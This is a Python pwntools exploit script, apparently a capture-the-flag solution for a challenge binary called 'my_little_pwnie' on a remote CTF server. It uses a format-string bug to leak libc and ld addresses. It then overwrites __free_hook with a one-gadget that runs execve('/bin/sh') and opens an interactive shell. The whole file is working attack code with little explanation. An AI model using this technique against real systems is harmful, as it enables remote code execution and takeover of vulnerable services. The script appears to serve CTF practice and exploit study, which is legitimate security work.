from pwn import *
# context.log_level="debug"
context.terminal=["terminator", "-e"]
elf_name = "./my_little_pwnie"
elf = ELF(elf_name)
elf.address = 0
context.binary=elf
#DEBUG

# r = process("./launch.sh", shell=True)

# REMOTE
libc = ELF("./libc-2.27.so")
# libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")
# libc = ELF("/glibc/x64/2.27/lib/libc-2.27.so")
while(True):
    r = remote("pwnie.zajebistyc.tf", 17003)
    # r = process(elf_name)
    # payload1 = "%13$p,%15$p,%34$p,%94$s"

    # gdb.attach(r)
    # gdb.attach(r, '''
    # b printf
    # c
    # ''')
    # raw_input("debug1")
    payload1 = "%7$p%9$p"
    r.sendline(payload1)
    response1 = r.recvline()
    ld_addr = response1[0:14]
    print "_init=",ld_addr
    ld_addr = ld_addr[0:10] + 'd710'
    lib_addr = response1[14:28]
    print "ld_addr=",ld_addr
    print "lib_addr=",lib_addr
    # libc.address = int(lib_addr, base=16) - 0x3fc39f
    libc.address = int(lib_addr, base=16) - 0x3fc39f
    ld_start = int(ld_addr, base=16) - 0x710
    print "libc.address =", hex(libc.address)
    print "ld_start =", hex(ld_start)
    exit_hook = ld_start + 0x60 + 0xf00

    # one_gadget -f ./libc-2.27.so
    # 0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
    # constraints:
    #   rsp & 0xf == 0
    #   rcx == NULL
    #
    # 0x4f432 execve("/bin/sh", rsp+0x40, environ)
    # constraints:
    #   [rsp+0x40] == NULL
    #
    # 0x10a41c execve("/bin/sh", rsp+0x70, environ)
    # constraints:
    #   [rsp+0x70] == NULL

    one_gaget = libc.address + 0x10a41c
    free_hook = libc.symbols['__free_hook']
    print "exit_hook:", hex(exit_hook)
    print "one_gaget:", hex(one_gaget)
    print "free_hook:", hex(free_hook)
    next_addr = libc.address + 0x3ecd80
    idx_addr = next_addr + 8
    print "next_addr:", hex(next_addr)
    payload2 = fmtstr_payload(6, {next_addr:1, idx_addr: 1, free_hook: one_gaget}, write_size='short')
    # payload2 = fmtstr_payload(6, {free_hook: one_gaget})
    r.sendline(payload2)
    r.recvrepeat(0.5)
    r.sendline("id")
    res = r.recvrepeat(0.5)
    # print res
    # if res != '':
    #     break

    r.interactive()